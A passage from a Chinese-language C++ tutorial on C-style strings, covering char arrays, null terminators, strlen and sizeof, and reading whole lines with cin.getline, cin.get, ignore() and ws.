class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 相邻的字符串字面值会被自动拼接</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is the first part, &quot;</span> <span class="string">&quot;and this is the second part.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 输出: This is the first part, and this is the second part.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以跨越多行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: Some text...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Line 2: More text...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Line 3: Final line.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    输出:</span></span><br><span class="line"><span class="comment">    Line 1: Some text...</span></span><br><span class="line"><span class="comment">    Line 2: More text...</span></span><br><span class="line"><span class="comment">    Line 3: Final line.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接结果是一个单独的字符串常量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* long_message = <span class="string">&quot;Part 1. &quot;</span></span><br><span class="line">                               <span class="string">&quot;Part 2. &quot;</span></span><br><span class="line">                               <span class="string">&quot;Part 3.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; long_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 输出: Part 1. Part 2. Part 3.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：变量和字符串字面值不能自动拼接</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> part1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; part1 &quot; world!&quot;; // 错误! 不能这样拼接变量和字面值</span></span><br><span class="line">    <span class="comment">// 需要使用 string 类的拼接操作 (见 4.3 节) 或 cout 的链式输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; part1 &lt;&lt; <span class="string">&quot; world!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-2-在数组中使用字符串"><a href="#4-2-2-在数组中使用字符串" class="headerlink" title="4.2.2 在数组中使用字符串"></a>4.2.2 在数组中使用字符串</h3><p>C风格字符串本质上是 <code>char</code> 类型的数组，其特殊之处在于最后一个字符必须是**空字符 (<code>\0</code>)**。这个空字符标记了字符串的实际结束位置。</p><p><strong>声明和初始化:</strong></p><p>可以使用字符串字面值来初始化 <code>char</code> 数组。编译器会自动计算大小（包括末尾的 <code>\0</code>）并将其复制到数组中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 包含 C 风格字符串函数库 (例如 strlen)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用字符串字面值初始化 char 数组</span></span><br><span class="line">    <span class="keyword">char</span> dog[<span class="number">8</span>] = <span class="string">&quot;fatcat&quot;</span>; <span class="comment">// 数组大小必须足够容纳字符串 + 空字符 (&#x27;f&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\0&#x27;)</span></span><br><span class="line">                            <span class="comment">// dog 数组大小为 8，实际使用 7 个字符 + 1 个空字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> bird[] = <span class="string">&quot;wren&quot;</span>;   <span class="comment">// 编译器自动推断大小为 5 (&#x27;w&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;\0&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用列表初始化 (需要显式包含空字符)</span></span><br><span class="line">    <span class="keyword">char</span> fish[] = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误示例：数组大小不足</span></span><br><span class="line">    <span class="comment">// char cat[3] = &quot;cat&quot;; // 错误! 需要大小 4 来存储 &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog: &quot;</span> &lt;&lt; dog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// cout 遇到空字符停止输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bird: &quot;</span> &lt;&lt; bird &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fish: &quot;</span> &lt;&lt; fish &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问单个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Third letter of dog: &quot;</span> &lt;&lt; dog[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;t&#x27;</span></span><br><span class="line">    dog[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>; <span class="comment">// 可以修改数组内容</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified dog: &quot;</span> &lt;&lt; dog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;patcat&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// strlen() 函数计算字符串长度 (不包括空字符)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of dog: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">strlen</span>(dog) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6 (因为现在是 &quot;patcat&quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of bird: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">strlen</span>(bird) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sizeof() 计算整个数组占用的内存大小 (包括空字符和未使用的空间)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of dog array: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(dog) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of bird array: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(bird) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li>  存储 C 风格字符串的 <code>char</code> 数组大小必须至少是字符串长度加 1（为 <code>\0</code> 留出空间）。</li><li>  字符串字面值初始化会自动添加 <code>\0</code>。</li><li>  列表初始化需要手动添加 <code>\0</code>。</li><li>  <code>strlen()</code> 计算的是到 <code>\0</code> 为止的字符数。</li><li>  <code>sizeof()</code> 计算的是整个数组的字节大小。</li></ul><h3 id="4-2-3-字符串输入"><a href="#4-2-3-字符串输入" class="headerlink" title="4.2.3 字符串输入"></a>4.2.3 字符串输入</h3><p>使用 <code>cin</code> 和 <code>&gt;&gt;</code> 运算符读取 C 风格字符串（存储在 <code>char</code> 数组中）时，存在一个主要限制：<code>cin</code> 默认以<strong>空白字符</strong>（空格、制表符、换行符）作为输入的分隔符。这意味着 <code>cin &gt;&gt;</code> 只会读取到第一个空白字符之前的部分。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> name[SIZE];</span><br><span class="line">    <span class="keyword">char</span> dessert[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your first name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; name; <span class="comment">// 读取直到遇到第一个空白字符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your favorite dessert: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; dessert; <span class="comment">// 读取直到遇到第一个空白字符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I see you like &quot;</span> &lt;&lt; dessert &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行示例及问题:</strong></p><p>如果用户输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter your first name: Ada Lovelace</span><br><span class="line">Enter your favorite dessert: Chocolate Cake</span><br></pre></td></tr></table></figure><p>程序输出将会是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello, Ada!</span><br><span class="line">I see you like Lovelace. </span><br></pre></td></tr></table></figure><p><strong>原因:</strong></p><ol><li> <code>cin &gt;&gt; name;</code> 读取到 “Ada” 后遇到空格停止，”Ada” 被存入 <code>name</code> 数组（并自动添加 <code>\0</code>）。</li><li> “ Lovelace\nChocolate Cake\n” 仍然留在输入缓冲区中。</li><li> <code>cin &gt;&gt; dessert;</code> 从缓冲区开始读取，跳过开头的空格，读取到 “Lovelace” 后遇到换行符停止，”Lovelace” 被存入 <code>dessert</code> 数组。</li></ol><p>这显然不是我们期望的结果。<code>cin &gt;&gt;</code> 不适合读取包含空格的字符串。此外，如果用户输入的单词长度超过了数组的大小（减去 <code>\0</code> 的空间），还会导致**缓冲区溢出 (Buffer Overflow)**，这是严重的安全隐患。</p><h3 id="4-2-4-每次读取一行字符串输入"><a href="#4-2-4-每次读取一行字符串输入" class="headerlink" title="4.2.4 每次读取一行字符串输入"></a>4.2.4 每次读取一行字符串输入</h3><p>为了解决 <code>cin &gt;&gt;</code> 的问题，<code>iostream</code> 库提供了其他成员函数来读取整行输入，包括其中的空格，直到遇到换行符为止。常用的有两个：<code>getline()</code> 和 <code>get()</code>。</p><p><strong>1. <code>cin.getline(char* buffer, int size, char delimiter = &#39;\n&#39;)</code></strong></p><ul><li>  <code>buffer</code>: 用于存储输入的 <code>char</code> 数组。</li><li>  <code>size</code>: 缓冲区的大小。<code>getline()</code> 最多读取 <code>size - 1</code> 个字符，以确保有空间存放末尾的空字符 <code>\0</code>。</li><li>  <code>delimiter</code> (可选): 指定读取停止的分隔符，默认为换行符 <code>\n</code>。</li></ul><p><strong>行为:</strong></p><ul><li>  读取字符到 <code>buffer</code> 中，直到读取了 <code>size - 1</code> 个字符、遇到 <code>delimiter</code> 或到达文件末尾。</li><li>  如果遇到 <code>delimiter</code>，它会<strong>读取并丢弃</strong>该分隔符（通常是换行符）。</li><li>  总是在读取的字符序列末尾添加空字符 <code>\0</code>。</li></ul><p><strong>2. <code>cin.get(char* buffer, int size, char delimiter = &#39;\n&#39;)</code></strong></p><ul><li>  参数与 <code>getline()</code> 类似。</li></ul><p><strong>行为:</strong></p><ul><li>  读取字符到 <code>buffer</code> 中，直到读取了 <code>size - 1</code> 个字符、遇到 <code>delimiter</code> 或到达文件末尾。</li><li>  与 <code>getline()</code> 不同的是，如果遇到 <code>delimiter</code>，它<strong>不会读取</strong>该分隔符，而是将其<strong>留在输入缓冲区中</strong>。</li><li>  总是在读取的字符序列末尾添加空字符 <code>\0</code>。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">char</span> fullName[SIZE];</span><br><span class="line">    <span class="keyword">char</span> address[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 getline()</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(fullName, SIZE); <span class="comment">// 读取整行，包括空格，丢弃换行符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your address: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(address, SIZE); <span class="comment">// 读取下一行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; fullName &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address: &quot;</span> &lt;&lt; address &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 get() - 注意换行符问题</span></span><br><span class="line">    <span class="keyword">char</span> title[SIZE];</span><br><span class="line">    <span class="keyword">char</span> author[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter book title: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(title, SIZE); <span class="comment">// 读取整行，换行符留在缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果直接调用下一个 get()，它会立即读到上一个留下的换行符并停止</span></span><br><span class="line">    <span class="comment">// std::cin.get(author, SIZE); // 这将导致 author 为空</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要处理掉留下的换行符</span></span><br><span class="line">    <span class="comment">// 方法一：再调用一次 get() 读取单个字符</span></span><br><span class="line">    <span class="comment">// std::cin.get(); // 读取并丢弃换行符</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法二：使用 ignore() 跳过字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">100</span>, <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// 跳过最多100个字符，直到遇到换行符（并丢弃换行符）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter author name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(author, SIZE); <span class="comment">// 现在可以正确读取作者名</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Title: &quot;</span> &lt;&lt; title &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Author: &quot;</span> &lt;&lt; author &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择 <code>getline()</code> 还是 <code>get()</code>?</strong></p><ul><li>  <code>getline()</code> 通常更方便，因为它会自动处理掉行尾的换行符，使得连续读取多行输入更简单。</li><li>  <code>get()</code> 提供了更精细的控制，因为它允许你检查下一个字符是否是换行符，但需要你手动处理留在缓冲区的分隔符。</li></ul><p><strong>空行和 <code>getline()</code>:</strong> 如果 <code>getline()</code> 遇到空行（即用户直接按 Enter），它会读取这个空行，将一个空字符串（只包含 <code>\0</code>）存入缓冲区，并丢弃换行符。</p><h3 id="4-2-5-混合输入字符串和数字"><a href="#4-2-5-混合输入字符串和数字" class="headerlink" title="4.2.5 混合输入字符串和数字"></a>4.2.5 混合输入字符串和数字</h3><p>当程序需要交替读取数字（使用 <code>cin &gt;&gt;</code>）和整行字符串（使用 <code>cin.getline()</code> 或 <code>cin.get()</code>）时，经常会遇到一个问题：<code>cin &gt;&gt;</code> 读取数字后，会将数字后面的<strong>换行符</strong>留在输入缓冲区中。</p><p>如果紧接着调用 <code>cin.getline()</code> 或 <code>cin.get()</code>，它们会立即读到这个残留的换行符，并认为已经到达行尾，导致读取失败或读到空字符串。</p><p><strong>问题示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; <span class="comment">// 读取年龄，换行符留在缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(name, <span class="number">50</span>); <span class="comment">// 立即读到残留的换行符，getline 结束，name 为空</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Name: []</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决方法:</strong></p><p>在读取数字后、调用 <code>getline()</code> 或 <code>get()</code> 读取整行之前，需要消耗掉输入缓冲区中残留的换行符。</p><ol><li><strong>使用 <code>cin.ignore()</code>:</strong> 这是常用的方法。<code>cin.ignore(n, delim)</code> 会跳过输入流中的字符，直到跳过了 <code>n</code> 个字符，或者遇到了 <code>delim</code> 分隔符（并丢弃该分隔符），以先到者为准。通常用于丢弃换行符： <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">100</span>, <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// 跳过最多100个字符，直到并包括下一个换行符</span></span><br><span class="line"><span class="comment">// 或者更简单地，如果确定只有一个换行符需要丢弃</span></span><br><span class="line"><span class="comment">// std::cin.ignore(); // 跳过下一个字符 (即换行符)</span></span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>(cin &gt;&gt; ws)</code>:</strong> C++11 引入了 <code>std::ws</code> 输入流操纵符，它可以读取并丢弃输入流开头的所有空白字符（包括换行符）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="built_in">std</span>::ws).getline(name, <span class="number">50</span>); </span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>cin.get()</code> 读取单个字符:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>.get(); <span class="comment">// 读取并丢弃换行符</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>修正后的示例 (使用 <code>cin.ignore()</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // 为了 numeric_limits (更健壮的 ignore)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除输入缓冲区，特别是换行符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line">    <span class="comment">// numeric_limits&lt;streamsize&gt;::max() 获取流能处理的最大字符数，确保清除整行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(name, <span class="number">50</span>); <span class="comment">// 现在可以正确读取姓名</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>修正后的示例 (使用 <code>ws</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ios&gt; // 为了 ws</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span 